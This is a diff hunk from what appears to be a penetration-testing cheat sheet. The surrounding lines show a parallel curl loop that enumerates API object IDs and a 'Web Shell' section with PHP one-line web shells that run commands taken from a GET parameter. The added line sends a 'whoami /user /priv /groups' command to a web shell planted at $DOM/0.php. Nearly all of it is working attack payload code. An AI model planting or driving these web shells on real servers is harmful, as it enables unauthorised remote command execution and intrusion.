@@ -217,6 +217,8 @@ cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H 
 
 [*] Web Shell
 +---------- CMD Shells ----------+
+curl -G '$DOM/0.php' --data-urlencode 'cmd=whoami /user /priv /groups'
+
 PHP
 <?=`$_GET[cmd]`?>
 <?php system($_GET['cmd']); ?>
